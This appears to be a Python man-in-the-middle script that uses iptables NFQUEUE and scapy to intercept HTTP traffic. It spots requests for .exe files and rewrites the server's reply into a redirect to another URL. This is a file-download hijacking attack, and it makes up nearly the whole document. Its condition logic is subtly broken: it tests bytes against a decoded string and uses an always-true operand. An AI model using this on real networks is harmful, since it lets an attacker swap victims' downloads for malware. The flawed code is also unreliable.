#!/usr/bin/env python3

import netfilterqueue  # For iptables queue management
import scapy.all as scapy

# Command to create iptables queue:
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0  (For forwarding packets)
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0   (For local device)
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  (For local device)
# sudo iptables --flush (To reset before running)

ack_list = []  # List to store ACK numbers of requested .exe files


def set_load(packet, load):
    """Modify the packet payload and recalculate necessary fields."""
    packet[scapy.Raw].load = load.encode()  # Convert string to bytes

    del packet[scapy.IP].len  # Remove checksums and length so Scapy can recalculate
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    """Processes intercepted packets and modifies responses to block .exe downloads."""
    scapy_packet = scapy.IP(packet.get_payload())  # Convert raw packet to Scapy packet

    if scapy_packet.haslayer(scapy.Raw):  # Check if the packet has a Raw layer
        if scapy_packet[scapy.TCP].dport == 80:  # Destination port 80 (HTTP request) 8080 port for bettercap ssl strip
            if b".exe" in scapy_packet[scapy.Raw].load.decode() and b" https://www.example.org/index.asp":  # Check if request contains ".exe"
                print("[+] .exe request detected. Saving ACK number.")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Store ACK number

        elif scapy_packet[scapy.TCP].sport == 80:  # Source port 80 (HTTP response)
            if scapy_packet[scapy.TCP].seq in ack_list:  # Match stored ACK
                print("[+] Intercepted response for .exe request. Redirecting...")
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Remove from list

                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n"
                )  # Redirect to a different page

                packet.set_payload(bytes(modified_packet))  # Set new payload

    packet.accept()  # Forward packet


queue = netfilterqueue.NetfilterQueue()  # Initialize Netfilter queue
queue.bind(0, process_packet)  # Bind queue number 0 with callback function
print("[+] Waiting for packets...")
queue.run()  # Start processing packets
